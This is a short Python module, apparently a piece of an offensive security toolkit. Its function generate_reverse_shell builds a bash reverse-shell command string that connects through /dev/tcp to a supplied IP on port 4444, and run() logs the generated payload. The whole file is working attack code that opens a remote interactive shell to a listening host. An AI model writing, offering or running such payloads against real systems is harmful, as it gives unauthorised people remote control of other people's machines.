import socket
import subprocess
from utils.logger import setup_logger

log = setup_logger()

def run(reverse_ip, config):
    log.info(f"Generating reverse shell payload for {reverse_ip}")
    payload = generate_reverse_shell(reverse_ip)
    log.info(f"Generated Payload: {payload}")

def generate_reverse_shell(reverse_ip, reverse_port=4444):
    payload = f"bash -i >& /dev/tcp/{reverse_ip}/{reverse_port} 0>&1"
    return payload
